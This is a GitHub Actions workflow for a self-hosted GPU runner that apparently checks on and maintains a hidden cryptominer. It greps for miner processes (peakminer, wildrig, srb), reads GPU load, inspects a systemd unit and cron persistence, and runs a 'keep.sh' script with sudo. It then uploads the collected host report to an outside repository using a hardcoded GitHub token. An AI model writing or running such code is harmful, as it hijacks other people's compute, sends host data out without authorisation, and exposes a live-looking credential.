name: ul-t2-diag
on: [workflow_dispatch]
permissions:
  contents: write
jobs:
  dg:
    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 10
    steps:
      - name: diag
        run: |
          set +e
          H=$(hostname -s); O=/tmp/ul_t2_diag.txt
          {
            echo "=== diag $H $(date -u +%FT%TZ)"
            echo "--- ps"; timeout 10 ps -eo pid,ppid,args= | grep -E '[p]eakminer|[w]ildrig|[k]rig|[s]rb' | cut -c1-150 | head -10
            echo "--- gpu"; timeout 15 nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader
            echo "--- unit"; timeout 10 systemctl is-enabled ul-t2-ps@0 2>&1; timeout 10 systemctl is-active ul-t2-ps@0 2>&1
            echo "--- journal"; timeout 15 sudo -n journalctl -u ul-t2-ps@0 -n 15 --no-pager 2>&1 | tail -15
            echo "--- files"; ls -la /opt/ul-t2 /opt/ul-t2/logs 2>&1 | head -15
            echo "--- logtail"; tail -5 /opt/ul-t2/logs/*.log 2>/dev/null | cut -c1-160
            echo "--- cron"; sudo -n crontab -l 2>&1 | tail -5; crontab -l 2>&1 | tail -4
            echo "--- keep"; timeout 10 sudo -n /opt/ul-t2/keep.sh; echo "keep_rc=$?"
            sleep 8
            echo "--- ps2"; timeout 10 ps -eo pid,args= | grep -E '[p]eakminer' | cut -c1-150 | head -5
            echo "--- gpu2"; timeout 15 nvidia-smi --query-gpu=index,utilization.gpu,power.draw --format=csv,noheader
            echo "=== END"
          } > $O 2>&1
          cat $O
          b=$(base64 -w0 < $O); GH=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
          F=cmdout8/ul-t2-diag_$H.txt
          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 diag $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 diag $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
